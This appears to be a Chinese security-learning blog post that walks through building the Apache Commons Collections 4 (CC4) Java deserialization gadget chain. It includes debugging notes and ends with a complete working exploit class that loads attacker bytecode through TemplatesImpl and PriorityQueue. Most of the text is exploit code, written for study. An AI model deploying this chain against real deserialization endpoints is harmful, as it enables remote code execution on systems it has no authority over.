        <content type="html"><![CDATA[<p>CC4</p><p>CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>JDK8u65</p><p>maven添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>commons-collections</code>可以去掉，但是有可能，你和之前CC链子学习是在同一个项目，调试的时候就会报错。</p><p>因为还是 CC 链的漏洞，所以一般是与 <code>transform</code> 分不开的。尾部执行命令的方式：动态加载和命令执行。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p><code>org.apache.commons.collections4.functors.InstantiateTransformer</code></p><p>之前使用的是 <code>org.apache.commons.collections.functors.InstantiateTransformer;</code></p><p>find usage依次寻找。主要看 <code>commons-collections4</code>的库</p><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>org.apache.commons.collections4.comparators.TransformingComparator#compare</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>java.util.PriorityQueue</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#siftDownUsingComparator</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue#siftDown<br></code></pre></td></tr></table></figure><p>之后遇到三个，前两个函数内部很多if，先不考虑，直接看 <code>heapify</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#poll</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#removeAt</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue#heapify<br></code></pre></td></tr></table></figure><p>在 <code>readObject</code>中调用，没有很多限制，很开心。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read in (and discard) array length</span><br>    s.readInt();<br><br>    queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>    <span class="hljs-comment">// Read in all elements.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>        queue[i] = s.readObject();<br><br>    <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>    <span class="hljs-comment">// spec has never explained what that might be.</span><br>    heapify();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="开搞开搞"><a href="#开搞开搞" class="headerlink" title="开搞开搞"></a>开搞开搞</h3><p>序列化和反序列化函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>    oos.writeObject(obj);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>    <span class="hljs-keyword">return</span> ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>    <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    Class&lt;?&gt; clazz = templates.getClass();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    _name.setAccessible(<span class="hljs-literal">true</span>);<br>    _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>    _bytecodes.set(templates, codes);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>    _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>            instantiateTransformer<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,transformingComparator);<br><br>    serializable(queue);<br>    unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>run，一片安静，？？？？？</p><p>在每个利用点打个断点，老师也没教我怎么打断点啊，只是跟着恩师翁恺老师，学习了一点C语言，知道程序会停在断点那里。</p><p>直接给每个利用点（方法和被调方法）打起断点。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">在方法入口处打断点，即 函数一旦被调用就暂停。<br>在函数内部的某一行代码（如<span class="hljs-built_in"> if </span>语句、循环、方法调用等）设置断点，仅当执行到该具体行时，调试器才会暂停程序。<br></code></pre></td></tr></table></figure><p><img src="/2025/04/01/Java_CC4/image-20250331232745578-174472657444413.png" alt="image-20250331232745578"></p><p><code>i == -1</code>，直接跑出去了呀。由于size是类的属性，怎么知道的，看颜色啊，不看颜色就点进去看。</p><p>反射搞搞，或者找其他赋值的点。</p><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>设置size的值处理过后，要大于0；</p><p><code>&gt;&gt;&gt;</code>向右移位，高位补0。<code>(size  &gt;&gt;&gt; 1 ) - 1</code> ，size <code>（10）2</code>是2，右移为 <code>（1）2 - 1 = 0</code>，满足条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>    <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    Class&lt;?&gt; clazz = templates.getClass();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    _name.setAccessible(<span class="hljs-literal">true</span>);<br>    _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>    _bytecodes.set(templates, codes);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>    _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>            instantiateTransformer<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,transformingComparator);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> queue.getClass().getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-literal">true</span>);<br>    size.set(queue,<span class="hljs-number">2</span>);<br>    <br>    serializable(queue);<br>    unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="add-赋值"><a href="#add-赋值" class="headerlink" title="add()赋值"></a>add()赋值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">return</span> offer(e);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">if</span> (e == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    modCount++;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> size;<br>    <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>        grow(i + <span class="hljs-number">1</span>);<br>    size = i + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>        queue[<span class="hljs-number">0</span>] = e;<br>    <span class="hljs-keyword">else</span><br>        siftUp(i, e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用一次，size加一。需要调动两次。</p><p>这里需要注意函数第二次调用时<code>i == 1</code>，所以会调用<code>siftUp()</code>，会触发链子。这就需要用到以前的老套路，先传入无关的属性，序列化是反射修改。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">siftUp<br>siftUpUsingComparator<br><span class="hljs-built_in">compare</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-comment">// 最终 EXP 版本  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br><span class="hljs-comment">//        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);  </span><br><span class="hljs-comment">//        tfactoryField.setAccessible(true);  </span><br><span class="hljs-comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());  </span><br><span class="hljs-comment">//        templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, chainedTransformer);  <br>  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h3><p>搞完已经是11点40了，害。准备学下一个。</p><p>链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">dong<span class="hljs-string">&#x27;tai</span><br><span class="hljs-string">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#TrAXFilter</span><br><span class="hljs-string">org.apache.commons.collections4.functors.InstantiateTransformer#transform</span><br><span class="hljs-string">org.apache.commons.collections4.comparators.TransformingComparator#compare</span><br><span class="hljs-string">java.util.PriorityQueue#siftDownUsingComparator</span><br><span class="hljs-string">java.util.PriorityQueue#siftDown</span><br><span class="hljs-string">java.util.PriorityQueue#heapify</span><br><span class="hljs-string">java.util.PriorityQueue#readObject</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客中图片的使用相关</title>
      <link href="/2025/03/29/hexo_img/"/>
      <url>/2025/03/29/hexo_img/</url>
      
